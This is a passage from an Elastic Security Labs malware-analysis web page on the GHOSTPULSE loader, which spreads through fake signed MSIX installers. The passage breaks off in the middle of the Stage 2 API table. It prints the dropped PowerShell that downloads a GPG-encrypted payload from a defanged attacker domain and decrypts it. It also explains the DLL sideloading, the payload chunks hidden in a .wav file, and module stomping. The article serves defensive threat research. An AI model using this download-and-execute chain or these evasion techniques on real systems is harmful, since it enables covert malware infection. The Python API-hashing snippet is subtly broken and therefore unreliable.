<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>GHOSTPULSE haunts victims using defense evasion bag o&#x27; tricks — Elastic Security Labs</title><meta name="description" content="Elastic Security Labs reveals details of a new campaign leveraging defense evasion capabilities to infect victims with malicious MSIX executables."/><meta property="og:title" content="GHOSTPULSE haunts victims using defense evasion bag o&#x27; tricks — Elastic Security Labs"/><meta property="og:description" content="Elastic Security Labs reveals details of a new campaign leveraging defense evasion capabilities to infect victims with malicious MSIX executables."/><meta property="og:image" content="https://www.elastic.co/security-labs/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/photo-edited-05@2x.jpg?00b9d179cba7c7f11640d285c0ea17b5"/><meta property="og:image:alt" content="Elastic Security Labs reveals details of a new campaign leveraging defense evasion capabilities to infect victims with malicious MSIX executables."/><meta property="og:site_name"/><meta property="og:url" content="https://www.elastic.co/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="GHOSTPULSE haunts victims using defense evasion bag o&#x27; tricks — Elastic Security Labs"/><meta name="twitter:description" content="Elastic Security Labs reveals details of a new campaign leveraging defense evasion capabilities to infect victims with malicious MSIX executables."/><meta name="twitter:image" content="https://www.elastic.co/security-labs/assets/images/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks/photo-edited-05@2x.jpg?00b9d179cba7c7f11640d285c0ea17b5"/><meta name="twitter:image:alt" content="Elastic Security Labs reveals details of a new campaign leveraging defense evasion capabilities to infect victims with malicious MSIX executables."/><link rel="canonical" href="https://www.elastic.co/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks"/><link rel="preload" href="/security-labs/logo.svg" as="image" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=3840&amp;q=75 3840w" imageSizes="100vw" fetchpriority="high"/><meta name="next-head-count" content="19"/><script src="https://play.vidyard.com/embed/v4.js" type="text/javascript" async=""></script><link rel="icon" href="/security-labs/favicon.svg"/><link rel="mask-icon" href="/security-labs/favicon.svg" color="#1C1E23"/><link rel="apple-touch-icon" href="/security-labs/favicon.svg"/><meta name="theme-color" content="#1C1E23"/><link rel="preload" href="/security-labs/_next/static/media/6d93bde91c0c2823-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/369c6e283c5acc6e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/92f44bb82993d879-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/ee71530a747ff30b-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/9fac010bc1f02be0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/cbf5fbad4d73afac-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><script id="google-tag-manager" data-nscript="beforeInteractive">
          (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
          'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
          })(window,document,'script','dataLayer','GTM-KNJMG2M');
          </script><link rel="preload" href="/security-labs/_next/static/css/265ed7605fd03477.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/265ed7605fd03477.css" data-n-g=""/><link rel="preload" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/security-labs/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/security-labs/_next/static/chunks/webpack-7987c6fda769d510.js" defer=""></script><script src="/security-labs/_next/static/chunks/framework-7a7e500878b44665.js" defer=""></script><script src="/security-labs/_next/static/chunks/main-ebd33a9f1cae5951.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/_app-cb8664d1d3df2511.js" defer=""></script><script src="/security-labs/_next/static/chunks/fec483df-43ee602fabdfe3a4.js" defer=""></script><script src="/security-labs/_next/static/chunks/877-34f408271ef44c22.js" defer=""></script><script src="/security-labs/_next/static/chunks/511-d08fe0fdd6f8a984.js" defer=""></script><script src="/security-labs/_next/static/chunks/683-a5053c37fe5bd0c9.js" defer=""></script><script src="/security-labs/_next/static/chunks/402-791da5e634930df4.js" defer=""></script><script src="/security-labs/_next/static/chunks/616-0b017b9cfa597392.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/%5Bslug%5D-3d74e9a05863bcfd.js" defer=""></script><script src="/security-labs/_next/static/dGrrQfBbQkqaleQ_11aBK/_buildManifest.js" defer=""></script><script src="/security-labs/_next/static/dGrrQfBbQkqaleQ_11aBK/_ssgManifest.js" defer=""></script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNJMG2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><main class="__variable_0351a5 __variable_1f211e __variable_a5b5f5 flex flex-col min-h-screen"><div class="scroll-percentage-container"><div class="scroll-percentage-bar" style="width:0%"></div></div><nav class="fixed w-full z-40" data-headlessui-state=""><div class="bg-gradient-to-b from-zinc-900 from-20% h-[200%] to-transparent absolute inset-0 z-0 pointer-events-none"></div><div class="container relative z-10"><div class="flex h-16 items-center justify-between"><div class="flex items-center justify-start w-full"><div><a class="hover:opacity-50 transition" href="/security-labs"><img alt="elastic security labs logo" fetchpriority="high" width="200" height="30" decoding="async" data-nimg="1" style="color:transparent" src="/security-labs/logo.svg"/></a></div><div class="hidden lg:ml-6 lg:block"><div class="flex space-x-4"><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/about"><span>About</span></a><div class="relative" data-headlessui-state=""><div><button class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" id="headlessui-menu-button-:R2kpm:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state="">Topics<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-1 -mr-1 h-4 w-4 text-zinc-400 relative top-[1px]"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"></path></svg></button></div></div><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/vulnerability-updates"><span>Vulnerability updates</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/reports"><span>Reports</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/tools"><span>Tools</span></a></div></div><div class="hidden lg:ml-auto lg:block"><div class="flex items-center space-x-4"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="https://www.elastic.co/security-labs/rss/feed.xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-4 w-4 mr-1"><path d="M3.75 3a.75.75 0 00-.75.75v.5c0 .414.336.75.75.75H4c6.075 0 11 4.925 11 11v.25c0 .414.336.75.75.75h.5a.75.75 0 00.75-.75V16C17 8.82 11.18 3 4 3h-.25z"></path><path d="M3 8.75A.75.75 0 013.75 8H4a8 8 0 018 8v.25a.75.75 0 01-.75.75h-.5a.75.75 0 01-.75-.75V16a6 6 0 00-6-6h-.25A.75.75 0 013 9.25v-.5zM7 15a2 2 0 11-4 0 2 2 0 014 0z"></path></svg><span class="hidden xl:block">Subscribe</span></a><a class="font-display inline-flex items-center justify-center rounded font-semibold disabled:!select-none disabled:!bg-gray-400 bg-blue-600 text-white hover:bg-blue-500 enabled:hover:text-white/80 transition-colors px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://cloud.elastic.co/registration?cta=cloud-registration&amp;tech=trial&amp;plcmt=navigation&amp;pg=security-labs">Start free trial</a><a class="font-display inline-flex items-center justify-center rounded font-semibold text-white disabled:!select-none disabled:!bg-gray-400 button px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://www.elastic.co/contact">Contact sales</a></div></div></div><div class="-mr-2 flex lg:hidden"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white" id="headlessui-disclosure-button-:R59m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open navigation menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><main class="mb-20 flex-1 flex flex-col"><div class="h-48 md:h-64"><div class="after:absolute after:block after:bg-blue-400 after:blur-3xl after:content-[&#x27; &#x27;] after:h-96 after:opacity-5 after:right-0 after:rounded-full after:top-20 after:w-1/2 after:z-0 before:absolute before:block before:blur-3xl before:bg-orange-400 before:content-[&#x27; &#x27;] before:h-96 before:left-0 before:opacity-5 before:rounded-full before:w-1/2 before:z-0 w-full h-full relative"><div class="relative z-10 w-full h-[125%] -top-[25%] bg-no-repeat bg-cover bg-bottom flex items-center justify-center" style="background-image:url(/security-labs/grid.svg)"></div></div></div><article class="px-4"><div class="max-w-7xl mx-auto relative z-10 flex flex-col space-y-4"><div class="eyebrow break-words"><time class="block mb-2 md:mb-0 md:inline-block article-published-date" dateTime="2023-10-27T00:00:00.000Z">27 October 2023</time><span class="hidden md:inline-block md:mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/salim-bitam">Salim Bitam</a><span class="mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/joe-desimone">Joe Desimone</a></div><h1 class="font-bold leading-tighter text-3xl md:text-5xl"><span>GHOSTPULSE haunts victims using defense evasion bag o'&nbsp;tricks</span></h1><p class="text-zinc-200 text-base md:text-xl">Elastic Security Labs reveals details of a new campaign leveraging defense evasion capabilities to infect victims with malicious MSIX executables.</p><div class="flex items-center mt-4 text-zinc-200 text-sm space-x-4 border-t border-white/25 pt-4"><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>17 min read</span></span><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M9.568 3H5.25A2.25 2.25 0 003 5.25v4.318c0 .597.237 1.17.659 1.591l9.581 9.581c.699.699 1.78.872 2.607.33a18.095 18.095 0 005.223-5.223c.542-.827.369-1.908-.33-2.607L11.16 3.66A2.25 2.25 0 009.568 3z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M6 6h.008v.008H6V6z"></path></svg><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/attack-pattern">Attack pattern</a>, </span><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/malware-analysis">Malware analysis</a></span></span></div></div><div class="max-w-7xl mx-auto"><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 sm:p-8 md:p-10 rounded-3xl mt-5 md:mt-10"><div class="relative w-full rounded-lg overflow-hidden aspect-video"><img alt="GHOSTPULSE haunts victims using defense evasion bag o&#x27; tricks" fetchpriority="high" decoding="async" data-nimg="fill" class="object-cover absolute h-full w-full" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" srcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=3840&amp;q=75 3840w" src="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks%2Fphoto-edited-05%402x.jpg&amp;w=3840&amp;q=75"/><div class="absolute border border-white/50 inset-0 mix-blend-overlay rounded-lg z-10"></div></div></div></div><div class="lg:max-w-7xl mx-auto relative mt-12 lg:grid lg:grid-cols-4 lg:gap-8 items-start"><div class="flex justify-center lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><h2 class="font-bold text-2xl md:text-4xl relative"><span id="update" class="absolute -top-32"></span>Update</h2>
<p>In October 2024, we released an update to stage 2 of GHOSTPULSE that includes new evasion techniques. You can check it out <a href="https://www.elastic.co/security-labs/tricks-and-treats">here</a>.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="preamble" class="absolute -top-32"></span>Preamble</h2>
<p>Elastic Security Labs has observed a campaign to compromise users with signed <a href="https://learn.microsoft.com/en-us/windows/msix/overview">MSIX</a> application packages to gain initial access. The campaign leverages a stealthy loader we call GHOSTPULSE which decrypts and injects its final payload to evade detection.</p>
<p>MSIX is a Windows app package format that developers can leverage to package, distribute, and install their applications to Windows users. With <a href="https://learn.microsoft.com/en-us/windows/msix/app-installer/app-installer-root">App Installer</a>, MSIX packages can be installed with a double click. This makes them a potential target for adversaries looking to compromise unsuspecting victims. However, MSIX requires access to purchased or stolen code signing certificates making them viable to groups of above-average resources.</p>
<p>In a common attack scenario, we suspect the users are directed to download malicious MSIX packages through <a href="https://www.proofpoint.com/us/blog/threat-insight/are-you-sure-your-browser-date-current-landscape-fake-browser-updates">compromised websites</a>, search-engine optimization (SEO) techniques, or malvertising. The masquerading themes we’ve observed include installers for Chrome, Brave, Edge, Grammarly, and WebEx to highlight a few.</p>
<p></p>
<p>From the user&#x27;s perspective, the “Install” button appears to function as intended. No pop-ups or warnings are presented. However, a PowerShell script is covertly used to download, decrypt, and execute GHOSTPULSE on the system.</p>
<p></p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="malware-analysis" class="absolute -top-32"></span>Malware Analysis</h2>
<p>The GHOSTPULSE loader can be broken down into 3 stages (sometimes preceded by a PowerShell script) used to execute a final payload.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="stage-0" class="absolute -top-32"></span>Stage 0</h3>
<p>We consider the PowerShell script dropped by the malicious MSIX installer to be the stage 0 payload. The PowerShell script is typically included in MSIX infection vectors, but not always in other GHOSTPULSE infection methods (MSI, EXE, ISO). In one sample, the PowerShell script downloads a GPG-encrypted file from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">manojsinghnegi[.]com/2.tar.gpg</code>.</p>
<p>Next, the PowerShell script decrypts the file using the command-line GPG utility using the following parameters:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">putin</code> - the passphrase for the GPG file</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--batch</code> - execute GPG in non-interactive mode</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--yes</code> - answer “yes” to any prompts</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--passphrase-fd 0</code> - read the passphrase from a file descriptor, 0 instructs GPG to use STDIN, which is putin</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--decrypt</code> - decrypt a file</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--output</code> - what to save the decrypted file as</li>
</ul>
<pre><code># 1
$url = &quot;https://manojsinghnegi[.]com/2.tar.gpg&quot;
$outputPath = &quot;$env:APPDATA\$xxx.gpg&quot;
Invoke-WebRequest -Uri $url -OutFile $outputPath

# 1
echo &#x27;putin&#x27; | .$env:APPDATA\gpg.exe --batch --yes --passphrase-fd 0 --decrypt --output $env:APPDATA\$xxx.rar $env:APPDATA\$xxx.gpg</code></pre>
<p>The GPG utility is included in the malicious MSIX installer package.</p>
<p>The decrypted file is a tar archive containing an executable <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">VBoxSVC.exe</code> which is in reality a renamed signed <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">gup.exe</code> executable that is used to update Notepad++, which is vulnerable to sideloading, an encrypted file in one example <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">handoff.wav</code> and a mostly benign library <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">libcurl.dll</code> with one of its functions overwritten with malicious code. The PowerShell executes the binary <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">VBoxSVC.exe</code> that will side load from the current directory the malicious DLL <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">libcurl.dll</code>. By minimizing the on-disk footprint of encrypted malicious code, the threat actor is able to evade file-based AV and ML scanning.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="stage-1" class="absolute -top-32"></span>Stage 1</h3>
<p>The first stage of GHOSTPULSE is embedded within a malicious DLL that undergoes side-loading through a benign executable. Execution of the corresponding code is triggered during the <em>DllEntryPoint</em> phase.</p>
<p>The process is initiated by pinpointing the base address of the malicious DLL of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">libcurl.dll</code>, achieved through parsing the <em>InLoadOrderModuleList</em> API. This list, residing in the Process Environment Block (PEB), systematically records information about loaded modules.</p>
<p></p>
<p>Next, GHOSTPULSE builds an Import Address Table (IAT) incorporating essential APIs. This operation involves parsing the <em>InLoadOrderModuleList</em> structure within the Process Environment Block (PEB).</p>
<p></p>
<pre><code># Python code used for API hashing
def calculate_api_name_hash(api_name):
    value = 0
    for char in input_string:
        total = (ord(char) + value *0x1003F)&amp;0xFFFFFFFF
    return value</code></pre>
<p>Below is the Stage 1 IAT structure reconstructed from the GHOSTPULSE malware sample, provided for reference:</p>
<pre><code>struct core_stage1_IAT
{
void *kernel32_LoadLibraryW;
void *kernel32_QueryPerformanceCounter;
void *ntdll_module;
void *kernel32_CloseHandle;
__int64 field_20;
__int64 field_28;
__int64 field_30;
__int64 field_38;
void *kernel32_GetTempPathW;
void *kernel32_GetModuleFileNameW;
__int64 field_50;
__int64 field_58;
__int64 field_60;
void *ntdll__swprintf;
__int64 field_70;
__int64 field_78;
__int64 (__fastcall *ntdll_RtlDecompressBuffer)(__int64, __int64, _QWORD, __int64, int, int *);
void *kernel32_CreateFileW;
void *kernel32_ReadFile;
void *ntdll_NtQueryInformationProcess;
void *kernel32_GetFileSize;
__int64 field_A8;
void *kernel32_module;
__int64 field_B8;
void *ntdll_NtDelayExecution;
__int64 (__fastcall *kernel32_GlobalAlloc)(__int64, __int64);
__int64 field_D0;
void *kernel32_GlobalFree;
__int64 field_E0;
void *ntdll_RtlQueryEnvironmentVariable_U;
};</code></pre>
<p>It then proceeds with its operation by reading and parsing the file named <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">handoff.wav</code> from the current directory. This file contains an encrypted data blob divided into distinct chunks. Each chunk of data is positioned following the string IDAT. The parsing process involves the malware executing through two distinct steps.</p>
<p></p>
<p>The initial phase involves identifying the commencement of the encrypted data by searching for the IDAT string in the file, which is followed by a distinctive 4-byte tag value. If the tag corresponds to the value stored in the malware&#x27;s configuration, the malware extracts the bytes of the encrypted blob. The initial structure is as follows:</p>
<pre><code>struct initial_idat_chunk
{
  DWORD size_of_chunk;
  DWORD IDAT_string;
  DWORD tag;
  DWORD xor_key;
  DWORD size_of_encrypted_blob;
  _BYTE first_chunk[];
};</code></pre>
<ul>
<li><strong>size_of_chunk</strong>: The malware utilizes this value, performing bits shifting to determine the chunk size to extract before the next occurrence of IDAT.</li>
<li><strong>xor_key</strong>: A 4-byte long XOR key employed for decrypting the consolidated encrypted blob after extraction</li>
<li><strong>size_of_encrypted_blob</strong>: Denotes the overall size of the encrypted blob, which is stored in chunks within the file</li>
<li><strong>first_chunk</strong>: Marks the start of the first chunk of data in memory</li>
</ul>
<p></p>
<p>In the second step, the malware locates the next occurrence of IDAT and proceeds to extract the encrypted chunks that follow it which has the following format:</p>
<pre><code>struct next_idat_chunk
{
DWORD size_of_chunk;
DWORD IDAT_string;
_BYTE n_chunk[];
};</code></pre>
<ul>
<li><strong>size_of_chunk</strong>: The malware utilizes this value, performing bits shifting to determine the chunk size to extract before the next occurrence of IDAT.</li>
<li><strong>n_chunk</strong>: Marks the start of the chunk of data in memory</li>
</ul>
<p>The malware continues extracting encrypted data chunks until it reaches the specified size_of_encrypted_blob. Subsequently, the malware proceeds to decrypt the data using the 4-byte XOR key <em>xor_key</em>.</p>
<p>At this stage, the data blob, which is already compressed, undergoes decompression by the malware. The decompression process utilizes the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RtlDecompressBuffer</code> api.</p>
<p></p>
<p>The malware proceeds by loading a specified library stored in its configuration, in this case, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">mshtml.dll</code>, utilizing the <em>LoadLibraryW</em> function. Shellcode (Stage 2) contained inside the decrypted and decompressed blob of data is written to the .text section of the freshly loaded DLL and then executed.</p>
<p>This technique is known as “module stomping”. The following image shows the associated <em>VirtualProtect</em> API calls captured with <a href="https://www.elastic.co/guide/en/security/current/install-endpoint.html">Elastic Defend</a> associated with the module stomping:</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="stage-2" class="absolute -top-32"></span>Stage 2</h3>
<p>Stage 2 initiates by constructing a new IAT structure and utilizing the CRC32 algorithm as the API name hashing mechanism.
The following is the IAT structure of stage 2:</p>
<pre><code>struct core_stage2_IAT
{
  void *kernel32_module;
  void *ntdll_module;
  void *kernel32_CreateFileW;
  void *kernel32_WriteFile;
  void *kernel32_ReadFile;
  void *kernel32_SetFilePointer;
  void *kernel32_CloseHandle;
  void *kernel32_GlobalAlloc;
  void *kernel32_GlobalFree;
  void *kernel32_ExpandEnvironmentStringsW;
  void *kernel32_GetFileSize;
  void *kernel32_GetProcAddress;
  void *kernel32_LoadLibraryW;
  void *ntdll__swprintf;
  void *kernel32_QueryPerformanceCounter;
  void *ntdll_RtlDecompressBuffer;
  void *field_80;
  void *field_88;
  void *field_90;
  void *field_98;
  void *field_A0;
  void *ntdll_NtDelayExecution;
  void *ntdll_RtlRandom;
  void *kernel32_GetModuleFileNameW;
  void *kernel32_GetCommandLineW;
  void *field_C8;
  void *ntdll_sscanf;
  void *field_D8;
  void *ntdll_NtQueryInformationProcess;
  void *ntdll_NtQuerySystemInformation;
  void *kernel32_CreateDirectoryW;
  void *kernel32_CopyFileW;
  void *ntdll_NtClose;
